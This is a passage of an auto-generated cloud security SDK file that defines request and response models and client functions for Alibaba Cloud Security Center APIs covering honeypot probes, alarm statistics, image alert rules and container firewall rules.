      probeId?: string(name='ProbeId', description='The ID of the probe.', example='a46f5162-c70d-4e26-8ddf-7435feca****'),
      serviceIpList?: [ string ](name='ServiceIpList', description='The IP addresses that are monitored.'),
      status?: int32(name='Status', description='The monitoring status. Valid values:

*   **1**: abnormal
*   **3**: normal', example='3'),
    }(name='HoneyPotProbeScanPort', description='The ports that the honeypot monitors.'),
    honeypotProbeBindList?: [ 
      {
        bindId?: string(name='BindId', description='The unique ID of the honeypot that is bound to the probe.', example='45378f64-d7b4-4a53-9c48-4303eb4b****'),
        bindPortList?: [ 
          {
            bindPort?: boolean(name='BindPort', description='Indicates whether the port is bound.', example='false'),
            endPort?: int32(name='EndPort', description='The end port on which the probe monitors.', example='80'),
            err?: string(name='Err', description='The error that is returned if an error occurred in the port of the honeypot that is bound to the probe.', example='portmap failed'),
            fixed?: boolean(name='Fixed', description='Indicates whether the port is a fixed port.', example='false'),
            id?: long(name='Id', description='The unique ID of the port binding record.', example='2512'),
            msg?: string(name='Msg', description='The error message that is returned if an error occurred in the port of the honeypot that is bound to the probe.', example='listen 22 tcp4 failed'),
            proto?: string(name='Proto', description='The type of the protocol.', example='tcp'),
            startPort?: int32(name='StartPort', description='The start port on which the probe monitors.', example='22'),
            status?: int32(name='Status', description='The status of the port of the honeypot that is bound to the probe. Valid values:

*   **1**: abnormal
*   **3**: normal', example='3'),
            targetPort?: int32(name='TargetPort', description='The destination port.', example='80'),
          }
        ](name='BindPortList', description='The ports that are bound to the probe.'),
        honeypotId?: string(name='HoneypotId', description='The honeypot ID.', example='913347774a3b3c378c6a50f66de23dfa097765214ec3f0526b01c67bf59c****'),
        serviceIpList?: [ string ](name='ServiceIpList', description='The IP addresses that are monitored.'),
        status?: int32(name='Status', description='The status of the honeypot that is bound to the probe. Valid values:

*   **1**: abnormal
*   **3**: normal', example='3'),
      }
    ](name='HoneypotProbeBindList', description='The honeypots that are bound to the probe.'),
    hostIp?: string(name='HostIp', description='The IP address of the server on which the probe is deployed.', example='33.53.XX.XX'),
    listenIpList?: [ string ](name='ListenIpList', description='An array consisting of the IP addresses that can be monitored.'),
    memoryLoad?: double(name='MemoryLoad', description='The memory usage.', example='1.94'),
    osType?: string(name='OsType', description='The operating system of the server on which the probe is deployed. Valid values:

*   windows
*   linux', example='windows'),
    ping?: boolean(name='Ping', description='Indicates whether ping is enabled for the check type.', example='false'),
    probeId?: string(name='ProbeId', description='The ID of the probe.', example='40f6501d-45ec-4bf0-b813-0072ceb4****'),
    probeType?: string(name='ProbeType', description='The type of the probe. Valid values:

*   **host_probe**: host probe
*   **vpc_black_hole_probe**: virtual private cloud (VPC) probe', example='host_probe'),
    probeVersion?: string(name='ProbeVersion', description='The version of the probe.', example='18060096'),
    proxyIp?: string(name='ProxyIp', description='The IP address of the proxy server.', example='47.108.XX.XX'),
    status?: int32(name='Status', description='The status of the probe. Valid values:

*   **installed**: installed
*   **install_failed**: installation failed
*   **online**: online
*   **offline**: offline
*   **unnormal**: abnormal
*   **unprobe**: unauthorized
*   **uninstalling**: being uninstalled
*   **uninstalled**: uninstalled
*   **uninstall_failed**: uninstallation failed
*   **not_exist**: not installed', example='online'),
    uuid?: string(name='Uuid', description='The UUID of the asset on which the host probe is deployed.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
    vpcId?: string(name='VpcId', description='The ID of the VPC in which the probe is deployed.', example='vpc-2vchkxmf2j9yjt3x2****'),
  }(name='Data', description='The information about the probe.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6550E0E6-FD6C-5F39-AB5E-35B30DCA97B5'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model GetHoneypotProbeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetHoneypotProbeResponseBody(name='body'),
}

/**
 * @summary Queries the details about a specified probe.
 *
 * @param request GetHoneypotProbeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetHoneypotProbeResponse
 */
async function getHoneypotProbeWithOptions(request: GetHoneypotProbeRequest, runtime: Util.RuntimeOptions): GetHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.probeId)) {
    query['ProbeId'] = request.probeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details about a specified probe.
 *
 * @param request GetHoneypotProbeRequest
 * @return GetHoneypotProbeResponse
 */
async function getHoneypotProbe(request: GetHoneypotProbeRequest): GetHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return getHoneypotProbeWithOptions(request, runtime);
}

model GetHoneypotStatisticsRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
}

model GetHoneypotStatisticsResponseBody = {
  code?: string(name='Code', description='The status code that is returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    totalHoneypotCount?: int32(name='TotalHoneypotCount', description='The total number of honeypots.', example='20'),
    totalNodeStatus?: int32(name='TotalNodeStatus', description='The health status of the management node. Valid values:

*   1: normal
*   2: abnormal', example='1'),
    totalProbeCount?: int32(name='TotalProbeCount', description='The total number of authorized probes.', example='40'),
    usedHoneypotCount?: int32(name='UsedHoneypotCount', description='The number of deployed honeypots.', example='7'),
    usedHostProbeCount?: int32(name='UsedHostProbeCount', description='The number of deployed host probes.', example='9'),
    usedProbeCount?: int32(name='UsedProbeCount', description='The number of deployed probes.', example='15'),
    usedVpcProbeCount?: int32(name='UsedVpcProbeCount', description='The number of deployed VPC probes.', example='6'),
  }(name='Data', description='The honeypot usage statistics.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='EB7181CB-32F3-5189-A935-4E24DD1A****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetHoneypotStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetHoneypotStatisticsResponseBody(name='body'),
}

/**
 * @summary 获取蜜罐使用量的统计数据
 *
 * @param request GetHoneypotStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetHoneypotStatisticsResponse
 */
async function getHoneypotStatisticsWithOptions(request: GetHoneypotStatisticsRequest, runtime: Util.RuntimeOptions): GetHoneypotStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetHoneypotStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary 获取蜜罐使用量的统计数据
 *
 * @param request GetHoneypotStatisticsRequest
 * @return GetHoneypotStatisticsResponse
 */
async function getHoneypotStatistics(request: GetHoneypotStatisticsRequest): GetHoneypotStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getHoneypotStatisticsWithOptions(request, runtime);
}

model GetImageEventOperationRequest {
  id?: long(name='Id', description='The primary key of the alert handling rule.', example='814163'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model GetImageEventOperationResponseBody = {
  code?: string(name='Code', description='The HTTP status code.', example='200'),
  data?: {
    conditions?: string(name='Conditions', description='The rule conditions. The value is in the JSON format. Valid values of keys:

*   **condition**: the matching condition.
*   **type**: the matching type.
*   **value**: the matching value.', example='[{\\\\"condition\\\\": \\\\"MD5\\\\", \\\\"type\\\\": \\\\"equals\\\\", \\\\"value\\\\": \\\\"0083a31cc0083a31ccf7c10367a6e783e\\\\"}]'),
    eventKey?: string(name='EventKey', description='The keyword of the alert item.', example='PEM'),
    eventName?: string(name='EventName', description='The name of the alert item.', example='PEM'),
    eventType?: string(name='EventType', description='The alert type. Valid values:

*   **sensitiveFile**', example='sensitiveFile'),
    id?: long(name='Id', description='The primary key of the alert handling rule.', example='443496'),
    note?: string(name='Note', description='The remarks.', example='No warning.'),
    operationCode?: string(name='OperationCode', description='The operation code. Valid values:

*   **whitelist**: added to the whitelist.', example='whitelist'),
    scenarios?: string(name='Scenarios', description='The application scope of the rule. The value is in the JSON format. Valid values of keys:

*   **type**
*   **value**', example='{\\\\"type\\\\": \\\\"repo\\\\", \\\\"value\\\\": \\\\"test-aaa/shenzhen-repo-01\\\\"}'),
    source?: string(name='Source', description='The source of the whitelist. Valid values:

*   **default**: image
*   **agentless**: agentless detection', example='agentless'),
  }(name='Data', description='The returned data.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='5861EE3E-F0B3-48B8-A5DC-A5080BFB****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetImageEventOperationResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetImageEventOperationResponseBody(name='body'),
}

/**
 * @summary Queries alert handling rules.
 *
 * @param request GetImageEventOperationRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetImageEventOperationResponse
 */
async function getImageEventOperationWithOptions(request: GetImageEventOperationRequest, runtime: Util.RuntimeOptions): GetImageEventOperationResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetImageEventOperation',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries alert handling rules.
 *
 * @param request GetImageEventOperationRequest
 * @return GetImageEventOperationResponse
 */
async function getImageEventOperation(request: GetImageEventOperationRequest): GetImageEventOperationResponse {
  var runtime = new Util.RuntimeOptions{};
  return getImageEventOperationWithOptions(request, runtime);
}

model GetImageScanNumInPeriodRequest {
  pastDay?: string(name='PastDay', description='The number of days.

This parameter is required.', example='7'),
}

model GetImageScanNumInPeriodResponseBody = {
  imageScanData?: {
    imageScanCount?: int32(name='ImageScanCount', description='The number of image scans.', example='150'),
  }(name='ImageScanData', description='The data returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92****'),
}

model GetImageScanNumInPeriodResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetImageScanNumInPeriodResponseBody(name='body'),
}

/**
 * @summary Queries the number of image scans that are performed within the last several days.
 *
 * @param request GetImageScanNumInPeriodRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetImageScanNumInPeriodResponse
 */
async function getImageScanNumInPeriodWithOptions(request: GetImageScanNumInPeriodRequest, runtime: Util.RuntimeOptions): GetImageScanNumInPeriodResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.pastDay)) {
    query['PastDay'] = request.pastDay;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetImageScanNumInPeriod',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the number of image scans that are performed within the last several days.
 *
 * @param request GetImageScanNumInPeriodRequest
 * @return GetImageScanNumInPeriodResponse
 */
async function getImageScanNumInPeriod(request: GetImageScanNumInPeriodRequest): GetImageScanNumInPeriodResponse {
  var runtime = new Util.RuntimeOptions{};
  return getImageScanNumInPeriodWithOptions(request, runtime);
}

model GetInstallCodeForUuidRequest {
  uuid?: string(name='Uuid', description='The UUID of the server for which the client installation code is to be queried.


> Call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) API to obtain this parameter.

This parameter is required.', example='eae0b46e-2155-422e-9565-ecc52c69****'),
}

model GetInstallCodeForUuidResponseBody = {
  code?: int32(name='Code', description='API status code.', example='200'),
  httpStatusCode?: long(name='HttpStatusCode', description='HTTP status code', example='200'),
  installCode?: {
    captchaCode?: string(name='CaptchaCode', description='Installation verification code for manually installing the Cloud Security Center client.', example='AK1W**'),
    expiredDate?: long(name='ExpiredDate', description='Expiration date of the installation verification code. The format is a 13-digit timestamp.
> The installation verification code can only be used within its validity period. Expired codes cannot be used.', example='1723860871689'),
    groupId?: long(name='GroupId', description='Server group ID.', example='342710'),
    groupName?: string(name='GroupName', description='Server group name.', example='TestGroup'),
    os?: string(name='Os', description='Operating system of the server. Values:

- **linux**: Linux

- **windows**: Windows', example='linux'),
    vendorName?: string(name='VendorName', description='Name of the server vendor.', example='ALIYUN'),
  }(name='InstallCode', description='Client installation code.'),
  message?: string(name='Message', description='Response message from the request.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the current request, a unique identifier generated by Alibaba Cloud for troubleshooting and issue localization.', example='7532B7EE-7CE7-5F4D-BF04-B12447DDCAE1'),
  success?: boolean(name='Success', description='The status of the returned query result. Values: - **true**: Success - **false**: Failure', example='true'),
}

model GetInstallCodeForUuidResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetInstallCodeForUuidResponseBody(name='body'),
}

/**
 * @summary Query Asset Installation Code
 *
 * @param request GetInstallCodeForUuidRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetInstallCodeForUuidResponse
 */
async function getInstallCodeForUuidWithOptions(request: GetInstallCodeForUuidRequest, runtime: Util.RuntimeOptions): GetInstallCodeForUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetInstallCodeForUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Query Asset Installation Code
 *
 * @param request GetInstallCodeForUuidRequest
 * @return GetInstallCodeForUuidResponse
 */
async function getInstallCodeForUuid(request: GetInstallCodeForUuidRequest): GetInstallCodeForUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return getInstallCodeForUuidWithOptions(request, runtime);
}

model GetInstanceAlarmStatisticsRequest {
  from?: string(name='From', description='The data source for statistics on instance alarms, with a default value of aqs:
- *sas*: Situation Awareness data source
- *aqs*: Alarm event data
- *honeypot*: Honeypot', example='sas'),
  uuid?: string(name='Uuid', description='The UUID of the server to be queried.
> Call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) API to obtain this parameter.', example='00fea5a1-9792-4373-ab1e-bb6536ba****'),
}

model GetInstanceAlarmStatisticsResponseBody = {
  data?: {
    remindCount?: int32(name='RemindCount', description='Reminder alarm count.', example='1'),
    seriousCount?: int32(name='SeriousCount', description='Critical alarm count.', example='1'),
    suspiciousCount?: int32(name='SuspiciousCount', description='Suspicious alarm count.', example='3'),
  }(name='Data', description='Data structure.'),
  requestId?: string(name='RequestId', description='阿里云为该请求生成的唯一标识符。', example='09969D2C-4FAD-429E-BFBF-9A60DEF8B****'),
}

model GetInstanceAlarmStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetInstanceAlarmStatisticsResponseBody(name='body'),
}

/**
 * @summary Count the number of security events for a single instance
 *
 * @param request GetInstanceAlarmStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetInstanceAlarmStatisticsResponse
 */
async function getInstanceAlarmStatisticsWithOptions(request: GetInstanceAlarmStatisticsRequest, runtime: Util.RuntimeOptions): GetInstanceAlarmStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetInstanceAlarmStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Count the number of security events for a single instance
 *
 * @param request GetInstanceAlarmStatisticsRequest
 * @return GetInstanceAlarmStatisticsResponse
 */
async function getInstanceAlarmStatistics(request: GetInstanceAlarmStatisticsRequest): GetInstanceAlarmStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getInstanceAlarmStatisticsWithOptions(request, runtime);
}

model GetInterceptionRuleDetailRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.

This parameter is required.', example='c7f60fdabc84xxx'),
  ruleId?: string(name='RuleId', description='The ID of the rule.

> You can call the [ListInterceptionRulePage](~~ListInterceptionRulePage~~) operation to query the IDs of rules.

This parameter is required.', example='500002'),
}

model GetInterceptionRuleDetailResponseBody = {
  interceptionRuleDetail?: {
    dstTarget?: {
      appName?: string(name='AppName', description='The name of the application.', example='console'),
      imageList?: [ string ](name='ImageList', description='An array that consists of the name of the image specified for the network object.'),
      namespace?: string(name='Namespace', description='The namespace to which the network object belongs.', example='kube-system'),
      ports?: [ string ](name='Ports', description='An array that consists of the port range of the destination network object.'),
      ruleType?: string(name='RuleType', description='The type of the rule.', example='customize'),
      tagList?: [ string ](name='TagList', description='An array that consists of the labels specified for the network object.'),
      targetId?: int32(name='TargetId', description='The ID of the network object.', example='200014'),
      targetName?: string(name='TargetName', description='The name of the object.', example='demo4-be1'),
      targetType?: string(name='TargetType', description='The type of the network object.', example='IMAGE'),
    }(name='DstTarget', description='The destination network object.'),
    interceptType?: long(name='InterceptType', description='The interception mode. Valid values:

*   **0**: monitor
*   **1**: block
*   **2**: alert
*   **3**: allow', example='1'),
    orderIndex?: long(name='OrderIndex', description='The priority of the rule. Valid values: 1 to 1000. A smaller value indicates a higher priority.', example='1'),
    ruleId?: long(name='RuleId', description='The ID of the rule.', example='467'),
    ruleName?: string(name='RuleName', description='The name of the rule.', example='dmz-frontend-accept'),
    ruleSwitch?: int32(name='RuleSwitch', description='The status of the defense rule. Valid values:

*   **1**: The rule is enabled.
*   **0**: The rule is disabled.', example='1'),
    ruleType?: string(name='RuleType', description='The type of the rule. Valid values:

*   **suggest**: a suggestion rule
*   **customize**: a custom rule', example='customize'),
    srcTarget?: {
      appName?: string(name='AppName', description='The name of the application.', example='console'),
      imageList?: [ string ](name='ImageList', description='The images of the network object.'),
      namespace?: string(name='Namespace', description='The namespace to which the network object belongs.', example='default'),
      ruleType?: string(name='RuleType', description='The type of the rule.', example='customize'),
      tagList?: [ string ](name='TagList', description='The labels specified for the network object.'),
      targetId?: int32(name='TargetId', description='The ID of the network object.', example='300635'),
      targetName?: string(name='TargetName', description='The name of the object.', example='dmz'),
      targetType?: string(name='TargetType', description='The type of the network object.', example='IMAGE'),
    }(name='SrcTarget', description='The source network object.'),
  }(name='InterceptionRuleDetail', description='The details of the rule.'),
  requestId?: string(name='RequestId', description='The request ID.', example='9FBC6E47-7508-xxx'),
}

model GetInterceptionRuleDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetInterceptionRuleDetailResponseBody(name='body'),
}

/**
 * @summary Queries the details of a microsegmentation defense rule.
 *
 * @param request GetInterceptionRuleDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetInterceptionRuleDetailResponse
 */
async function getInterceptionRuleDetailWithOptions(request: GetInterceptionRuleDetailRequest, runtime: Util.RuntimeOptions): GetInterceptionRuleDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetInterceptionRuleDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of a microsegmentation defense rule.
 *
 * @param request GetInterceptionRuleDetailRequest
 * @return GetInterceptionRuleDetailResponse
 */
async function getInterceptionRuleDetail(request: GetInterceptionRuleDetailRequest): GetInterceptionRuleDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getInterceptionRuleDetailWithOptions(request, runtime);
}

model GetInterceptionSummaryRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster.

> You can call the [DescribeGroupedContainerInstances](https://help.aliyun.com/document_detail/421736.html) operation to query the IDs of clusters.', example='c2999***bb61b'),
}

model GetInterceptionSummaryResponseBody = {
  interceptionSummary?: {
    closeClusterCount?: int32(name='CloseClusterCount', description='The number of clusters that are not protected.', example='0'),
    closeRuleCount?: int32(name='CloseRuleCount', description='The number of disabled cluster defense rules.', example='0'),
    clusterCount?: int32(name='ClusterCount', description='The total number of clusters.', example='0'),
    interceptionCountInDays?: int32(name='InterceptionCountInDays', description='The total number of interception records for the specified cluster.', example='0'),
    openClusterCount?: int32(name='OpenClusterCount', description='The number of clusters that are protected.', example='0'),
    openRuleCount?: int32(name='OpenRuleCount', description='The number of enabled cluster defense rules.', example='0'),
    riskCount180Day?: long(name='RiskCount180Day', description='The number of security risks that are detected in the last 180 days.', example='0'),
    riskCount30Day?: long(name='RiskCount30Day', description='The number of security risks that are detected in the last 30 days.', example='0'),
    riskCountToday?: long(name='RiskCountToday', description='The number of security risks that are detected in the last 24 hours.', example='0'),
    ruleCount?: int32(name='RuleCount', description='The total number of cluster defense rules.', example='0'),
  }(name='InterceptionSummary', description='The statistics.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760E840'),
}

model GetInterceptionSummaryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetInterceptionSummaryResponseBody(name='body'),
}

/**
 * @summary Queries the statistics of the container firewall feature.
 *
 * @param request GetInterceptionSummaryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetInterceptionSummaryResponse
 */
async function getInterceptionSummaryWithOptions(request: GetInterceptionSummaryRequest, runtime: Util.RuntimeOptions): GetInterceptionSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetInterceptionSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics of the container firewall feature.
 *
 * @param request GetInterceptionSummaryRequest
 * @return GetInterceptionSummaryResponse
 */
async function getInterceptionSummary(request: GetInterceptionSummaryRequest): GetInterceptionSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getInterceptionSummaryWithOptions(request, runtime);
}

model GetInterceptionTargetDetailRequest {
  targetId?: long(name='TargetId', description='The ID of the network object.

> You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the IDs of network objects.

This parameter is required.', example='402008'),
}

model GetInterceptionTargetDetailResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0DC1F8'),
  ruleTarget?: {
    appName?: string(name='AppName', description='The name of the application to which the network object belongs.', example='netperf-client'),
    clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='ca6e6594def8d4be8b2795fd12c32****'),
    clusterName?: string(name='ClusterName', description='The name of the container cluster.', example='sas-test-cnnf'),
    imageList?: [ string ](name='ImageList', description='An array that consists of the images of the network object.'),
    namespace?: string(name='Namespace', description='The namespace.', example='secondary'),
    tagList?: [ string ](name='TagList', description='An array that consists of the labels specified for the network object.'),
    targetId?: long(name='TargetId', description='The ID of the network object.', example='400723'),
    targetName?: string(name='TargetName', description='The name of the network object.', example='destination-test-obj-Na3cF'),
    targetType?: string(name='TargetType', description='The type of the network object. Valid values:

*   **IMAGE**: image', example='IMAGE'),
  }(name='RuleTarget', description='The information about the network object.'),
}

model GetInterceptionTargetDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetInterceptionTargetDetailResponseBody(name='body'),
}

/**
 * @summary Queries the information about a specified network object that is protected by the container firewall feature.
 *
 * @param request GetInterceptionTargetDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetInterceptionTargetDetailResponse
 */
async function getInterceptionTargetDetailWithOptions(request: GetInterceptionTargetDetailRequest, runtime: Util.RuntimeOptions): GetInterceptionTargetDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.targetId)) {
    query['TargetId'] = request.targetId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetInterceptionTargetDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about a specified network object that is protected by the container firewall feature.
 *
 * @param request GetInterceptionTargetDetailRequest
 * @return GetInterceptionTargetDetailResponse
 */
async function getInterceptionTargetDetail(request: GetInterceptionTargetDetailRequest): GetInterceptionTargetDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getInterceptionTargetDetailWithOptions(request, runtime);
}

model GetLastOnceTaskInfoRequest {
  source?: string(name='Source', description='The source of the task.', example='console_batch'),
  taskName?: string(name='TaskName', description='The name of the task. Valid values:

*   **CLIENT_PROBLEM_CHECK**: client diagnosis task
*   **CLIENT_DEV_OPS**: O\\\\&M task of Cloud Assistant
*   **ASSETS_COLLECTION**: asset collection task

This parameter is required.', example='ASSETS_COLLECTION'),
  taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **CLIENT_PROBLEM_CHECK**: client diagnosis task
*   **CLIENT_DEV_OPS**: O\\\\&M task of Cloud Assistant
*   **ASSETS_COLLECTION**: asset collection task

This parameter is required.', example='ASSETS_COLLECTION'),
}

model GetLastOnceTaskInfoResponseBody = {
  collectTime?: long(name='CollectTime', description='The time at which the task was run.', example='1671184531000'),
  finishCount?: int32(name='FinishCount', description='The number of tasks that have been completed.', example='67'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
  taskId?: long(name='TaskId', description='The ID of the latest scan task.', example='3f65e1f1bb13118891a889d569a3****'),
  taskInfo?: {
    progress?: int32(name='Progress', description='The progress of the task in percentage.', example='69'),
